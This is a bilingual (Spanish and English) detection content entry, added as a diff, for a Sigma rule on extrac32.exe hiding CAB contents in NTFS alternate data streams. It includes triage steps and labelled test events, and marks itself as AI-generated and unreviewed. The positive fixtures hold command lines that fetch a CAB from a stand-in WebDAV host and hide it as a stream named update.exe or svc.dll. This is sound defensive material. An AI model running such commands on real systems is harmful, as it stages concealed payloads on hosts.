@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "4b13db67-0c45-40f1-aba8-66a1a7198a1e",
+    "title": "Suspicious Extrac32 Alternate Data Stream Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1564.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó extrac32.exe con un archivo CAB y un destino que contiene dos puntos que no forman parte de una unidad. Esto suele indicar que el contenido extraído se escribe en un flujo de datos alternativo (ADS) de NTFS.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene 'extrac32.exe' y '.cab' y además dos puntos seguidos de algo distinto de una barra invertida. Ese patrón coincide con destinos como 'archivo.txt:payload.exe' y no con 'C:\\'.",
+      "why_it_matters": "Extrac32 es un binario firmado de Windows documentado en LOLBAS. Guardar el contenido de un CAB en un ADS oculta un payload detrás de un archivo inofensivo (T1564.004, ocultar artefactos con atributos NTFS) y permite ejecutarlo después desde ese flujo.",
+      "triage_steps": [
+        "Revise el CommandLine e identifique el origen del CAB (ruta local, UNC o WebDAV) y el destino archivo:flujo.",
+        "Revise ParentImage y el usuario. Busque intérpretes de scripts, aplicaciones de Office o cmd/PowerShell lanzados desde una sesión de usuario.",
+        "En el host, ejecute 'Get-Item <archivo> -Stream *' para listar los flujos. Obtenga el hash del contenido y recójalo sin ejecutarlo.",
+        "Busque en el mismo host, +/- 15 minutos, procesos que hagan referencia al mismo archivo:flujo, como wmic, rundll32, cscript, mshta o start.",
+        "Si el CAB provino de un recurso remoto, revise el host o IP en los logs de proxy, DNS y SMB/WebDAV y verifique su reputación.",
+        "Revise alertas previas del mismo host o usuario y busque el mismo nombre de CAB o de flujo en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla no indica ninguno. El uso legítimo de extrac32 con destino en un ADS es muy poco común.",
+        "Ejercicios autorizados de red team o pruebas LOLBAS que reproducen el ejemplo documentado.",
+        "Algunos scripts administrativos o de empaquetado que guardan datos en flujos. Confírmelo con el responsable del script."
+      ],
+      "response_steps": [
+        "Confirme si la actividad es maliciosa revisando el contenido del flujo, su hash y la cadena de procesos padre.",
+        "Si es maliciosa, aísle el endpoint y bloquee el recurso compartido o dominio de origen del CAB.",
+        "Elimine el flujo o el archivo contenedor solo después de recoger la evidencia, y busque el mismo hash o nombre de flujo en toda la red.",
+        "Si la cadena de procesos apunta a phishing o uso de credenciales, restablezca las credenciales del usuario afectado y vigile el host por si hay reinfección."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque extrac32 escribiendo en un ADS es una técnica de ocultamiento clara, pero el evento por sí solo no prueba que el payload se haya ejecutado."
+    },
+    "en": {
+      "summary": "extrac32.exe was run with a CAB file and a destination containing a colon that is not part of a drive path. This usually means the extracted content is written into an NTFS alternate data stream (ADS).",
+      "what_it_detects": "Process creation events where CommandLine contains 'extrac32.exe' and '.cab', and also has a colon followed by something other than a backslash. That pattern matches targets like 'file.txt:payload.exe' rather than 'C:\\'.",
+      "why_it_matters": "Extrac32 is a signed Windows binary listed in LOLBAS. Writing CAB contents into an ADS hides a payload behind a harmless-looking file (T1564.004, Hide Artifacts: NTFS File Attributes). The payload can then be run from the stream.",
+      "triage_steps": [
+        "Read CommandLine and note the CAB source (local, UNC or WebDAV path) and the destination file:stream name.",
+        "Check ParentImage and the user. Look for script hosts, Office apps or cmd/PowerShell launched from a user context.",
+        "On the host, run 'Get-Item <file> -Stream *' to list streams, then hash and collect the stream content without running it.",
+        "Check the same host within +/- 15 minutes for processes that reference the same file:stream, such as wmic, rundll32, cscript, mshta or start.",
+        "If the CAB came from a remote share, look up the host or IP in proxy, DNS and SMB/WebDAV logs and check its reputation.",
+        "Look for earlier alerts on this host or user, and for the same CAB name or stream name on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists none. Legitimate use of extrac32 with an ADS destination is very uncommon.",
+        "Authorized red team or LOLBAS testing that copies the documented ADS example.",
+        "Rare administrative or packaging scripts that store data in streams. Confirm with the script owner."
+      ],
+      "response_steps": [
+        "Confirm the activity is malicious by reviewing the stream content, its hash and the parent process chain.",
+        "If it is malicious, isolate the endpoint and block the CAB source share or domain.",
+        "Remove the malicious stream or host file only after collecting evidence, then hunt for the same hash or stream name across the fleet.",
+        "Reset the affected user's credentials if the parent chain points to phishing or credential use, then watch the host for re-infection."
+      ],
+      "severity_rationale": "Medium fits because extrac32 writing to an ADS is a strong hiding technique, but the event alone does not prove the payload was executed."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Extrac32 extrae un CAB desde un recurso WebDAV hacia un ADS de un archivo de texto en Public",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\extrac32.exe",
+          "CommandLine": "extrac32.exe /Y /C \\\\files.example.com@SSL\\DavWWWRoot\\pkg\\update.cab C:\\Users\\Public\\notes.txt:update.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Extrac32 con ruta completa escribe el contenido de un CAB local en un flujo alternativo de un archivo en ProgramData",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\extrac32.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\extrac32.exe\" /C C:\\Users\\mrojas\\Downloads\\invoice.cab C:\\ProgramData\\cache.log:svc.dll",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Uso legítimo de extrac32 para extraer un CAB de controladores a una carpeta normal; los únicos dos puntos son de letras de unidad seguidas de barra invertida",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\extrac32.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\extrac32.exe\" /Y /E C:\\Temp\\drivers.cab /L C:\\Temp\\out",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Expand.exe escribe en un ADS, pero el CommandLine no contiene extrac32.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\expand.exe",
+          "CommandLine": "expand.exe C:\\Temp\\setup.cab C:\\Temp\\readme.txt:data.bin",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
